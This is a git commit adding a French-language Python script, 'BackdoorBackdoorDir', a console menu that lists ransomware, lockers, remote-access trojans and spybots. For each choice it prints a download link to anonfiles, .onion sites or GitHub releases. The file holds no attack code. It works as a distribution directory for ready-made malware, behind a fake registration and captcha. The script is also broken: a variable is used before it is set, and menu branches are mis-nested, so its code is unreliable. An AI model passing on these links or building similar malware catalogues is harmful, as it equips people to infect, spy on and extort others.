30a18ec799aae5b7c97d80c7a976a2601d129d02
Naff Ruby <110056919+2e0@users.noreply.github.com>
2022-07-28 23:10:01 +0200

    Add files via upload

---
+++ index.py
@@ -0,0 +1,188 @@
+
+import pystyle
+import time
+import os
+import random
+from pystyle import *
+os.system('clear')
+rxz = random.randint(1000, 9999)
+banner = '''
+
+
+ ▄▄▄▄    ▄▄▄       ▄████▄   ██ ▄█▀▓█████▄  ▒█████   ▒█████   ██▀███  ▓█████▄  ██▓ ██▀███  
+▓█████▄ ▒████▄    ▒██▀ ▀█   ██▄█▒ ▒██▀ ██▌▒██▒  ██▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ██▌▓██▒▓██ ▒ ██▒
+▒██▒ ▄██▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ░██   █▌▒██░  ██▒▒██░  ██▒▓██ ░▄█ ▒░██   █▌▒██▒▓██ ░▄█ ▒
+▒██░█▀  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░▓█▄   ▌▒██   ██░▒██   ██░▒██▀▀█▄  ░▓█▄   ▌░██░▒██▀▀█▄  
+░▓█  ▀█▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▓ ░ ████▓▒░░ ████▓▒░░██▓ ▒██▒░▒████▓ ░██░░██▓ ▒██▒
+░▒▓███▀▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒▓  ▒ ░▓  ░ ▒▓ ░▒▓░
+▒░▒   ░   ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░ ▒ ▒░   ░▒ ░ ▒░ ░ ▒  ▒  ▒ ░  ░▒ ░ ▒░
+ ░    ░   ░   ▒   ░        ░ ░░ ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░░   ░  ░ ░  ░  ▒ ░  ░░   ░ 
+ ░            ░  ░░ ░      ░  ░      ░        ░ ░      ░ ░     ░        ░     ░     ░     
+      ░           ░                ░                                  ░                   
+
+'''
+
+print(Colorate.Color(Colors.red, banner , True))
+
+
+
+
+
+#
+
+print(Colorate.Color(Colors.orange, "Bienvenu dans BackdoorBackdoorDir" , True))
+
+time.sleep(1)
+
+os.system('clear')
+
+reponse = input(Colorate.Color(Colors.orange, "Register (mettez 1): " , True))
+
+if(reponse == "1"):
+
+	os.system("clear")
+	input(Colorate.Color(Colors.orange, "User :" , True))
+	input(Colorate.Color(Colors.orange, "Pass :" , True))
+	input(Colorate.Color(Colors.orange, "Pass Confirm :" , True))
+	suprax = input(Colorate.Color(Colors.orange, "Captcha (" +str(rxz) + ") : "  , True))
+
+elif(suprax == str(rxz)):
+
+	os.system("clear")
+
+	print(Colorate.Color(Colors.red, banner, True))
+
+else:
+	print('💀')
+
+tar0 = '''
+• 1 andr0id_l0cker              • 6 RaaS
+• 2 DangerousRaaS               • 7 CryptoLocker
+• 3 888 RAT
+• 4 LimeRAT
+• 5 XSS PoC
+
+Veuillez choisir le malware que vous vouliez installer : 
+'''
+tar1 = '''
+
+
+• 1 SpazBot
+• 2 Spy4
+• 3 AndroRAT
+• 4 PlasmaHTTP
+• 5 Quasar
+
+Veuillez choisir votre spybot : 
+'''
+banner0 = '''
+
+
+[+] 1 Malwares                        [+] 6 Spambots 
+[+] 2 Spybots [NEW]                   [+] 7 Scammas Pages
+[+] 3 Botnets                         [+] 8 Chatbots
+[+] 4 Reversebots                     [+] 9 S.E
+[+] 5 Panels [NEW]                    [+] 999 Exit
+
+
+Choisissez un catalogue : 
+'''
+
+
+os.system('clear')
+print(Colorate.Color(Colors.red, banner, True))
+x = input(Colorate.Color(Colors.red, banner0, True))
+
+
+
+
+
+if(x == "2"):
+
+	os.system('clear')
+	time.sleep(3)
+	print(Colorate.Color(Colors.red, banner, True))
+modyolo = input(Colorate.Color(Colors.red, tar1, True))
+
+
+if(x == "1"):
+        os.system('clear')
+        time.sleep(3)
+        print(Colorate.Color(Colors.red, banner, True))
+yeo = input(Colorate.Color(Colors.red, tar0, True))
+
+
+
+if(yeo == "1"):
+
+	os.system('clear')
+	print(Colorate.Color(Colors.red, banner, True))
+	print(Colorate.Color(Colors.green, "Voici le lien de l'installation (anonfile) : https://anonfiles.com/H8M470v1y2/andr0id_l0cker_zip", True))
+
+if(yeo == "2"):
+
+	os.system('clear')
+	print(Colorate.Color(Colors.red, banner, True))
+	print(Colorate.Color(Colors.green, "Voici le lien de l'installation : https://anonfiles.com/tfM0LfX3xa/Dangerous_RAT_zip", True))
+
+if(yeo == "3"):
+
+	os.system('clear')
+	print(Colorate.Color(Colors.red, banner, True))
+	print(Colorate.Color(Colors.green, "Voici le lien de l'installation : http://bestteermb42clir6ux7xm76d4jjodh3fpahjqgbddbmfrgp4skg2wqd.onion.torproxy.in/download/file.php?id=1265", True))
+
+if(yeo == "4"):
+
+	os.system('clear')
+	print(Colorate.Color(Colors.red, banner, True))
+	print(Colorate.Color(Colors.green, "Voici le lien de l'installation : https://github.com/NYAN-x-CAT/Lime-RAT/releases/download/v0.1.9.2/Compiled.zip", True))
+
+if(yeo == "5"):
+
+	os.system('clear')
+	print(Colorate.Color(Colors.red, banner, True))
+	print(Colorate.Color(Colors.green, "Voici le lien de l'installation : https://www.bishopfox.com/blog/2017/06/how-i-built-an-xss-worm-on-atmail/", True))
+
+if(yeo == "6"):
+
+	os.system('clear')
+	print(Colorate.Color(Colors.red, banner, True))
+	print(Colorate.Color(Colors.green, "Voici le lien de l'installation : http://ygamskhreuqawl4zdsi6je36g4rc4f5re2jk7fdoyhsddeh32buf6jqd.onion/", True))
+
+if(modyolo == "1"):
+	os.system('clear')
+	print(Colorate.Color(Colors.red, banner, True))
+	print(Colorate.Color(Colors.green, "Voici le lien de l'installation : https://anonfiles.com/Ffe3A9v8y4/SpazBot2.12_June2007_zip", True))
+
+
+if(modyolo == "2"):
+
+	os.system('clear')
+	print(Colorate.Color(Colors.red, banner, True))
+	print(Colorate.Color(Colors.green, "Voici le lien de l'installation : http://bestteermb42clir6ux7xm76d4jjodh3fpahjqgbddbmfrgp4skg2wqd.onion/download/file.php?id=485", True))
+
+if(modyolo == "3"):
+
+	os.system('clear')
+	print(Colorate.Color(Colors.red, banner, True))
+	print(Colorate.Color(Colors.green, "Voici le lien de l'installation : http://bestteermb42clir6ux7xm76d4jjodh3fpahjqgbddbmfrgp4skg2wqd.onion/download/file.php?id=820", True))
+
+if(modyolo == "4"):
+
+	os.system('clear')
+	print(Colorate.Color(Colors.red, banner, True))
+	print(Colorate.Color(Colors.green, "Voici le lien de l'installation : https://anonfiles.com/rfj1Adveyf/PlasmaHTTP_zip", True))
+
+if(modyolo == "5"):
+
+	os.system('clear')
+	print(Colorate.Color(Colors.red, banner, True))
+	print(Colorate.Color(Colors.green, "Voici le lien de l'installation : https://github.com/quasar/QuasarRAT/releases", True))
+
+
+
+
+
+
+
+
